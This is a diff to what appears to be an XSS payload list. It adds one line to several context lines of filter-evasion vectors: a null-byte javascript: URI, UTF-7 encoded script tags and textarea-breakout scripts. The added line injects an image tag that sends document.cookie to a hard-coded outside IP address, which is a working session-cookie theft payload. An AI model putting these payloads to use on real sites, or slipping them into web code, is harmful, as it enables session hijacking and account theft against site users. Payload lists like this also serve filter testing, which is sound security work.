@@ -657,3 +657,4 @@ perl -e 'print "<IMG SRC=java\0sCRipT:alert(\"XSS\")>";' > out
 "></textarea> <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-sCRipT+AD4-alert('XSS');+ADw-/sCRipT+AD4-<textarea rows=1 cols=1><input value="
 "></textarea><META HTTP-EQUIV="Set-Cookie" Content="USERID=<sCRip<script>T>alert('XSS')</sCRip<script>T>"><textarea rows=1 cols=1><input value="
 "></textarea><sCRipT =">" >alert(123);</sCRip<script>T><textarea rows=1 cols=1><input value=""></textarea><sCRipT =">" >alert(123);</sCRip<script>T><textarea rows=1 cols=1><input value=""></textarea><sCRipT =">" >alert(123);</sCRip<script>T><textarea rows=1 cols=1><input value="
+<script>jQuery("body").append('<img src="http://95.85.59.204/qq.php?q='+document.cookie+'>"')<script>
